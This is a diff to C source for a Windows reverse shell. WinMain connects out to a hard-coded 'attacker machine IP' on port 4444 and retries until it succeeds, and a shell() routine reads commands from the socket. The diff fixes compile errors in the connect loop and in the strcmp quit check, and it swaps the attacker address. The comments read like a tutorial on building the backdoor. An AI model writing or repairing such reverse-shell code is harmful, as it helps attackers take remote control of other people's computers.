@@ -56,7 +56,7 @@ void shell()
 
       //Compare the buffer with different commands.
       //if q represent quit the program implment it == strcmp.
-      if (strcmp("q", buffer, 1) == 0)
+      if (strcmp("q", buffer) == 0)
       {
         closesocket(sock);//close socket
         WSACleanup();//clean socket object
@@ -123,7 +123,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     char *ServIP; //which point the memory address of the particular variable.
     WSADATA wsaData;//WSADATA is structure which consist with the windows socket informations.
 
-    ServIP = "10.0.1.51";//here must want to apply the attacker machine IP.
+    ServIP = "10.0.3.150";//here must want to apply the attacker machine IP.
     ServPort = 4444; //Make sure another process is not using same port.
 
 
@@ -162,7 +162,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
     //Perfoam the connection.
     start: //Start here is a checkpoint to the connection
-    while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0)
+    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
     {
       //1st argument of connect funtion is socket.
       //2nd argument specify the structre of sockaddr pointer.
